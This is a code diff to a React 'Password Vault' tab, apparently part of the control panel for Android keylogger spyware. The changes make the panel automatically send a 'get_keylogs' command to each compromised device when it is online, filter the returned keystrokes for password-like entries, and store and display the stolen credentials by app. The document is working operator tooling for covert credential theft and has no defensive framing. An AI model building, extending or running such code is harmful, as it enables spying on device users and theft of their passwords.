@@ -49,7 +49,7 @@ function AppIcon({ pkg }) {
 
 function PasswordEntry({ entry, onDelete }) {
   const [revealed, setRevealed] = useState(false);
-  const [copied, setCopied] = useState(false);
+  const [copied, setCopied]     = useState(false);
 
   const handleCopy = () => {
     navigator.clipboard.writeText(entry.value).catch(() => {});
@@ -73,6 +73,11 @@ function PasswordEntry({ entry, onDelete }) {
               {entry.fieldHint}
             </span>
           )}
+          {entry.source === 'device' && (
+            <span style={{ fontSize: 10, background: 'rgba(34,197,94,0.15)', color: '#22c55e', padding: '1px 6px', borderRadius: 4 }}>
+              device
+            </span>
+          )}
         </div>
         <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
           <div style={{
@@ -87,14 +92,12 @@ function PasswordEntry({ entry, onDelete }) {
           </div>
           <button
             onClick={() => setRevealed(v => !v)}
-            title={revealed ? 'Hide' : 'Reveal'}
             style={{ background: revealed ? 'rgba(239,68,68,0.1)' : 'rgba(34,197,94,0.1)', border: `1px solid ${revealed ? 'rgba(239,68,68,0.3)' : 'rgba(34,197,94,0.3)'}`, borderRadius: 6, padding: '4px 10px', color: revealed ? '#ef4444' : '#22c55e', cursor: 'pointer', fontSize: 12, fontWeight: 600, flexShrink: 0 }}
           >
             {revealed ? '🙈 Hide' : '👁 Reveal'}
           </button>
           <button
             onClick={handleCopy}
-            title="Copy password"
             style={{ background: copied ? 'rgba(34,197,94,0.1)' : '#1a1a2e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '4px 10px', color: copied ? '#22c55e' : '#94a3b8', cursor: 'pointer', fontSize: 12, flexShrink: 0 }}
           >
             {copied ? '✓' : '📋'}
@@ -107,22 +110,43 @@ function PasswordEntry({ entry, onDelete }) {
       </div>
       <button
         onClick={() => onDelete(entry.id)}
-        title="Remove entry"
         style={{ background: 'none', border: 'none', color: '#ef4444', cursor: 'pointer', fontSize: 14, flexShrink: 0 }}
       >✕</button>
     </div>
   );
 }
 
-function storageKey(deviceId) {
-  return `captured_passwords_${deviceId}`;
-}
-
+function storageKey(deviceId) { return `captured_passwords_${deviceId}`; }
 function loadPasswords(deviceId) {
   try { return JSON.parse(localStorage.getItem(storageKey(deviceId)) || '[]'); } catch { return []; }
 }
 function savePasswords(deviceId, list) {
   localStorage.setItem(storageKey(deviceId), JSON.stringify(list));
+}
+
+function absorbKeylogEntries(entries, existingIds, deviceId) {
+  const newEntries = [];
+  entries.forEach(entry => {
+    const text         = entry.text || entry.content || '';
+    const fieldHint    = entry.fieldType || entry.inputType || entry.field || '';
+    const isPasswordFlag = entry.isPassword;
+    const eventType    = entry.eventType || '';
+    if (!looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) return;
+    const id = entry.id || (entry.timestamp + text);
+    if (existingIds.has(id)) return;
+    existingIds.add(id);
+    newEntries.push({
+      id: id + '_' + Date.now(),
+      value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
+      appName:    entry.appName || entry.app || '',
+      appPackage: entry.packageName || entry.pkg || '',
+      fieldHint:  fieldHint || (isPasswordFlag ? 'password' : ''),
+      capturedAt: entry.timestamp || Date.now(),
+      source:     entry.source || 'keylog',
+      isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
+    });
+  });
+  return newEntries;
 }
 
 export default function PasswordsTab({ device, sendCommand, results, keylogPushEntries }) {
@@ -132,46 +156,44 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
   const [passwords, setPasswords] = useState(() => loadPasswords(deviceId));
   const [sortBy, setSortBy]       = useState('time');
   const [search, setSearch]       = useState('');
-  const [revealAll, setRevealAll] = useState(false);
   const [filterApp, setFilterApp] = useState('');
-
+  const [syncing, setSyncing]     = useState(false);
+  const [syncStatus, setSyncStatus] = useState('');
   const [loading, setLoading]     = useState(false);
-  const seenIds = useRef(new Set());
 
-  // Reload passwords when switching to a different device
+  const seenIds    = useRef(new Set());
+  const fetchedRef = useRef(false);
+
   useEffect(() => {
     setPasswords(loadPasswords(deviceId));
     seenIds.current = new Set();
     setSearch('');
     setFilterApp('');
+    fetchedRef.current = false;
+    setSyncStatus('');
   }, [deviceId]);
 
-  // Absorb keylog push entries for password detection
+  // Auto-fetch from device when online — runs once per device mount
+  useEffect(() => {
+    if (isOnline && !fetchedRef.current) {
+      fetchedRef.current = true;
+      setSyncing(true);
+      setSyncStatus('Fetching passwords from device…');
+      sendCommand(deviceId, 'get_keylogs', { limit: 1000 });
+
+      // Give the device up to 30 s to respond, then clear spinner
+      const t = setTimeout(() => {
+        setSyncing(false);
+        setSyncStatus('');
+      }, 30000);
+      return () => clearTimeout(t);
+    }
+  }, [isOnline, deviceId]);
+
+  // Absorb keylog push entries (live stream)
   useEffect(() => {
     if (!keylogPushEntries || keylogPushEntries.length === 0) return;
-    const newEntries = [];
-    keylogPushEntries.forEach(entry => {
-      const id = entry.id || (entry.timestamp + entry.text);
-      if (seenIds.current.has(id)) return;
-      seenIds.current.add(id);
-
-      const text = entry.text || entry.content || '';
-      const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
-      const isPasswordFlag = entry.isPassword;
-      const eventType = entry.eventType || '';
-      if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
-        newEntries.push({
-          id: id + '_' + Date.now(),
-          value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
-          appName: entry.appName || entry.app || '',
-          appPackage: entry.packageName || entry.pkg || '',
-          fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
-          capturedAt: entry.timestamp || Date.now(),
-          source: 'keylog',
-          isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
-        });
-      }
-    });
+    const newEntries = absorbKeylogEntries(keylogPushEntries, seenIds.current, deviceId);
     if (newEntries.length > 0) {
       setPasswords(prev => {
         const updated = [...newEntries, ...prev];
@@ -181,46 +203,36 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
     }
   }, [keylogPushEntries]);
 
-  // Absorb command results (e.g. get_keylogs)
+  // Absorb command results — get_keylogs (manual scan OR auto-fetch)
   useEffect(() => {
     results.forEach(r => {
-      if (r.command === 'get_keylogs' && r.success && r.response && !seenIds.current.has('result_' + r.id)) {
-        seenIds.current.add('result_' + r.id);
-        setLoading(false);
-        try {
-          const data = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
-          const entries = data.keylogs || data.logs || data.entries || [];
-          const newEntries = [];
-          entries.forEach(entry => {
-            const text = entry.text || entry.content || '';
-            const fieldHint = entry.fieldType || entry.inputType || entry.field || '';
-            const isPasswordFlag = entry.isPassword;
-            const eventType = entry.eventType || '';
-            if (looksLikePassword(text, fieldHint, isPasswordFlag, eventType)) {
-              const id = (entry.id || entry.timestamp + text);
-              if (!seenIds.current.has(id)) {
-                seenIds.current.add(id);
-                newEntries.push({
-                  id: id + '_scan',
-                  value: extractPasswordValue(text, fieldHint, isPasswordFlag, eventType),
-                  appName: entry.appName || entry.app || '',
-                  appPackage: entry.packageName || entry.pkg || '',
-                  fieldHint: fieldHint || (isPasswordFlag ? 'password' : ''),
-                  capturedAt: entry.timestamp || Date.now(),
-                  source: 'scan',
-                  isPassword: isPasswordFlag === true || isPasswordFlag === 'true',
-                });
-              }
-            }
+      if (r.command !== 'get_keylogs' || !r.success || !r.response) return;
+      const resultKey = 'result_' + r.id;
+      if (seenIds.current.has(resultKey)) return;
+      seenIds.current.add(resultKey);
+
+      setLoading(false);
+      setSyncing(false);
+
+      try {
+        const data    = typeof r.response === 'string' ? JSON.parse(r.response) : r.response;
+        const entries = data.keylogs || data.logs || data.entries || data.keylogEntries
+                     || data.data   || data.results || [];
+        const newEntries = absorbKeylogEntries(entries, seenIds.current, deviceId);
+        if (newEntries.length > 0) {
+          setPasswords(prev => {
+            const updated = [...newEntries, ...prev];
+            savePasswords(deviceId, updated);
+            return updated;
           });
-          if (newEntries.length > 0) {
-            setPasswords(prev => {
-              const updated = [...newEntries, ...prev];
-              savePasswords(deviceId, updated);
-              return updated;
-            });
-          }
-        } catch (_) {}
+          setSyncStatus(`Synced ${newEntries.length} new password${newEntries.length !== 1 ? 's' : ''} from device`);
+          setTimeout(() => setSyncStatus(''), 5000);
+        } else {
+          setSyncStatus('Sync complete — no new passwords found');
+          setTimeout(() => setSyncStatus(''), 4000);
+        }
+      } catch (_) {
+        setSyncStatus('');
       }
     });
   }, [results]);
@@ -228,7 +240,9 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
   const handleScan = () => {
     if (!isOnline) return;
     setLoading(true);
-    sendCommand(deviceId, 'get_keylogs', { limit: 500 });
+    setSyncing(true);
+    setSyncStatus('Fetching passwords from device…');
+    sendCommand(deviceId, 'get_keylogs', { limit: 1000 });
   };
 
   const deleteEntry = (id) => {
@@ -245,7 +259,6 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
     savePasswords(deviceId, []);
   };
 
-  // Filtering & sorting
   const apps = [...new Set(passwords.map(p => p.appPackage || '').filter(Boolean))];
 
   let visible = passwords.filter(p => {
@@ -273,14 +286,26 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
         <span style={{ fontSize: 20 }}>🔑</span>
         <div>
           <div style={{ fontWeight: 700, fontSize: 14 }}>Password Vault</div>
-          <div style={{ fontSize: 11, color: '#94a3b8' }}>{passwords.length} captured credential{passwords.length !== 1 ? 's' : ''} · auto-detected from keylogger</div>
+          <div style={{ fontSize: 11, color: '#94a3b8' }}>
+            {passwords.length} credential{passwords.length !== 1 ? 's' : ''} · auto-detected from keylogger
+          </div>
         </div>
         <div style={{ flex: 1 }} />
+
+        {/* Sync status */}
+        {(syncing || syncStatus) && (
+          <div style={{ fontSize: 11, color: syncing ? '#f59e0b' : '#22c55e', display: 'flex', alignItems: 'center', gap: 5 }}>
+            {syncing && <span style={{ animation: 'spin 1s linear infinite', display: 'inline-block' }}>⏳</span>}
+            {syncStatus}
+          </div>
+        )}
+
         <button
           onClick={handleScan}
-          disabled={!isOnline || loading}
-          style={{ background: '#7c3aed', border: 'none', borderRadius: 6, color: '#fff', padding: '6px 14px', fontSize: 12, cursor: 'pointer', fontWeight: 600, opacity: !isOnline ? 0.5 : 1 }}
-        >{loading ? '⏳ Scanning…' : '🔍 Scan Keylogs'}</button>
+          disabled={!isOnline || loading || syncing}
+          style={{ background: '#7c3aed', border: 'none', borderRadius: 6, color: '#fff', padding: '6px 14px', fontSize: 12, cursor: 'pointer', fontWeight: 600, opacity: (!isOnline || loading || syncing) ? 0.5 : 1 }}
+        >{loading || syncing ? '⏳ Syncing…' : '🔄 Sync from Device'}</button>
+
         {passwords.length > 0 && (
           <button
             onClick={clearAll}
@@ -288,6 +313,13 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
           >🗑️ Clear All</button>
         )}
       </div>
+
+      {/* Offline notice */}
+      {!isOnline && (
+        <div style={{ background: 'rgba(239,68,68,0.07)', border: '1px solid rgba(239,68,68,0.2)', borderRadius: 8, padding: '10px 14px', fontSize: 12, color: '#94a3b8' }}>
+          ⚠️ Device is offline — showing {passwords.length} previously captured credential{passwords.length !== 1 ? 's' : ''}. New passwords will sync automatically when the device reconnects.
+        </div>
+      )}
 
       {/* Filters */}
       {passwords.length > 0 && (
@@ -303,9 +335,9 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
             onChange={e => setFilterApp(e.target.value)}
             style={{ background: '#16213e', border: '1px solid #2d2d4e', borderRadius: 6, padding: '6px 10px', color: '#f0f0ff', fontSize: 12 }}
           >
-            <option value="">All Apps</option>
+            <option value="">All Apps ({passwords.length})</option>
             {apps.map(pkg => (
-              <option key={pkg} value={pkg}>{pkg}</option>
+              <option key={pkg} value={pkg}>{pkg.split('.').pop()} ({passwords.filter(p => p.appPackage === pkg).length})</option>
             ))}
           </select>
           <div style={{ display: 'flex', gap: 4 }}>
@@ -325,10 +357,15 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
       {passwords.length === 0 && (
         <div style={{ background: '#16213e', border: '1px dashed #2d2d4e', borderRadius: 10, padding: '50px 20px', textAlign: 'center', color: '#64748b' }}>
           <div style={{ fontSize: 40, marginBottom: 12 }}>🔒</div>
-          <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 6 }}>No passwords captured yet</div>
+          <div style={{ fontSize: 14, fontWeight: 600, marginBottom: 6 }}>
+            {syncing ? 'Fetching passwords from device…' : 'No passwords captured yet'}
+          </div>
           <div style={{ fontSize: 12 }}>
-            Passwords are auto-detected from keylog entries.<br />
-            Click <strong>Scan Keylogs</strong> to search existing logs, or they'll appear automatically as the device user types passwords.
+            {syncing
+              ? 'Please wait — this may take a few seconds.'
+              : <>Passwords are auto-detected from keylog entries.<br />
+                 {isOnline ? 'Sync is running automatically…' : 'Connect the device to sync.'}</>
+            }
           </div>
         </div>
       )}
@@ -347,7 +384,7 @@ export default function PasswordsTab({ device, sendCommand, results, keylogPushE
 
       {/* Info */}
       <div style={{ background: 'rgba(124,58,237,0.08)', border: '1px solid rgba(124,58,237,0.2)', borderRadius: 8, padding: '10px 14px', fontSize: 11, color: '#94a3b8' }}>
-        ℹ️ Passwords are detected automatically when keylog entries contain password-like fields (password, pin, token, etc.). Data is stored locally per device in your browser and never sent to any server.
+        ℹ️ Passwords are auto-detected and synced from device keylog entries. Data is stored locally per device in your browser. Sync runs automatically when you open this tab and whenever the device is online.
       </div>
     </div>
   );
